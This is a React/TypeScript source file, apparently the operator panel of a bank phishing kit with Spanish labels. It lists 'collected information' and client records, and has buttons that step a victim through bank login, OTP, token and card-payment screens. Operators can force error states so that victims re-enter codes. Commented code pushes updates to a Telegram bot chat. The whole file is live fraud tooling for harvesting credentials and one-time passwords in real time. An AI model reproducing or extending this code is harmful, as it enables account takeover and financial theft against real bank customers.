import { Button } from '@/components/ui/button';
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogFooter,
  DialogHeader,
  DialogTitle,
  DialogTrigger,
} from '@/components/ui/dialog';
import { Input } from '@/components/ui/input';
import { Label } from '@/components/ui/label';
import { WebEngageV1InfoAirports } from '../card-render';
import { Badge } from '@/components/ui/badge';
import { CATALOG_STEPS } from '@/lib/const';
import { Separator } from '@/components/ui/separator';
import { createClient } from '@/lib/supabase/client';
import React from 'react';
import { selectColorStatus } from '@/lib/utils';
import { Cross2Icon } from '@radix-ui/react-icons';
import { MessageCircleDashed } from 'lucide-react';
import DrawerComments from './drawer-comments';
import { User } from '@supabase/supabase-js';
type openCardInfo = WebEngageV1InfoAirports | undefined;
interface IProps {
  data: openCardInfo;
  openCard: number | undefined;
  setOpenCard: React.Dispatch<number | undefined>;
  user: User;
}
interface TypeButtonOptions {
  label: string;
  option: {
    error: boolean;
    step: number;
  };
}
[];
const ModalDetail = (props: IProps) => {
  const supabase = createClient();
  console.log(props.openCard);

  const [showMessages, setShowMessages] = React.useState(false);
  const handleClose = () => props.setOpenCard(undefined);
  const CURRENT_STEP = CATALOG_STEPS[props.data?.currentStep.step ?? 0];
  const updateStep = async (step: number, err: boolean) => {
    await supabase
      .from('panel')
      .update({
        currentStep: {
          error: false,
          step: step,
        },
      })
      .eq('id', props.data?.id)
      .select()
      .then((res) => {
        console.log(res);
      });
  };
  const isStateLoading = CURRENT_STEP === 'LOADING';
  const COLOR_SELECTED = selectColorStatus(CURRENT_STEP);

  return (
    <Dialog open={Boolean(props.openCard)} onOpenChange={handleClose}>
      <DialogContent className='overflow-auto border-none rounded-none sm:max-w-2xl h-dvh'>
        <DrawerComments {...props} />

        <DialogHeader>
          <div className='flex justify-center gap-3 mb-1'>
            <DialogTitle className='leading-6'>
              {props.data?.firstName} {props.data?.lastName}
            </DialogTitle>
            <section className='relative'>
              <Badge variant={COLOR_SELECTED}>{CURRENT_STEP}</Badge>
              {isStateLoading && (
                <span className='absolute inset-0 inline-flex w-full h-full duration-500 scale-75 bg-green-400 rounded-md animate-ping' />
              )}
            </section>
          </div>

          <DialogDescription className='grid grid-cols-4 gap-2'>
            {BUTTONS_OPTIONS.map((d) => (
              <Button
                key={d.label}
                variant={'secondary'}
                disabled={!isStateLoading}
                onClick={() => updateStep(d.option.step, d.option.error)}
              >
                {d.label}
              </Button>
            ))}
          </DialogDescription>
        </DialogHeader>

        <section className='space-y-2'>
          <h2 className='mb-0 font-semibold text-center'>
            INFORMACION RECOLECTADA 🌱
          </h2>
          <Separator />

          <ul className='relative grid text-xs text-gray-100 rounded-lg gap-x-8 gap-y-2 bg-section md:text-lg'>
            {props.data &&
              props.data.process_history
                ?.map((d, i) => {
                  return (
                    <li key={i} className='flex flex-col'>
                      <header className='flex justify-between'>
                        <code className='font-semibold text-left'>
                          {typeof d.step === 'number' && CATALOG_STEPS[d.step]}
                        </code>
                        <code className='text-left '>Enviador: Pablo</code>
                      </header>
                      <div className='grid grid-cols-2 mx-4 gap-y-1'>
                        <div className='contents'>
                          {Object.entries(d.data).map(([key, value]) => (
                            <li key={key} className='contents'>
                              <code className='text-left'>{key}:</code>
                              <code className='overflow-hidden text-right truncate'>
                                {String(value)}
                              </code>
                            </li>
                          ))}
                        </div>
                      </div>
                      <Separator className='mt-2' />
                    </li>
                  );
                })
                .reverse()}
          </ul>
        </section>
        <section className='space-y-2'>
          <h2 className='font-semibold text-center'>
            INFORMACION DEL CLIENTE 🙆‍♂️
          </h2>
          <ul className='relative grid grid-cols-2 text-xs text-gray-100 rounded-lg gap-x-8 gap-y-2 bg-section md:text-lg'>
            {props.data &&
              Object.entries(props.data).map(([key, value]) => (
                <li key={key} className='contents'>
                  <code className='text-left'>{key}:</code>
                  <code className='overflow-hidden text-right truncate'>
                    {String(value)}
                  </code>
                </li>
              ))}
          </ul>
        </section>
        {/* <DialogFooter>
      <Button onClick={handleClose}>Close</Button>
    </DialogFooter> */}
      </DialogContent>
    </Dialog>
  );
};

export default ModalDetail;

// const handleStatus = async () =>{

//     await supabase
//     .from("panel")
//     .update({
//       currentStep: data.step,
//     })
//     .eq("id", data.id)
//     .select()
//     .then((res) => {
//       bot.api.sendMessage(
//         callbackQuery.chat?.id ?? 6279340085,
//         `
//         CLIENTE ACTUALIZADO CON EXITO!

//         🏷️ ${data.id}
//         📌 ${CATALOG_STEPS[data.step]}
//         🧙‍♂️ ${
//           callbackQuery.update.callback_query.from.username ??
//             (callbackQuery.update.callback_query.from.first_name ?? "No name")
//         }
//         `,
//       );
//       console.log(res);
//     });
//   }

const BUTTONS_OPTIONS: TypeButtonOptions[] = [
  {
    label: '🏦 LG',
    option: {
      error: false,
      step: CATALOG_STEPS.BANK_LOGO,
    },
  },
  {
    label: '📲 OTP',
    option: {
      error: false,
      step: CATALOG_STEPS.OTP,
    },
  },
  {
    label: '⏳ TK',
    option: {
      error: false,
      step: CATALOG_STEPS.TK,
    },
  },
  {
    label: '❌ TC',
    option: {
      error: true,
      step: CATALOG_STEPS.PAYMENT_INFORMATION,
    },
  },
  {
    label: '❌ LG',
    option: {
      error: true,
      step: CATALOG_STEPS.BANK_LOGO,
    },
  },
  {
    label: '❌ OTP',
    option: {
      error: true,
      step: CATALOG_STEPS.OTP,
    },
  },
  {
    label: '❌ TK',
    option: {
      error: true,
      step: CATALOG_STEPS.TK,
    },
  },
  {
    label: '✅ FIN',
    option: {
      error: false,
      step: CATALOG_STEPS.FINAL,
    },
  },
];
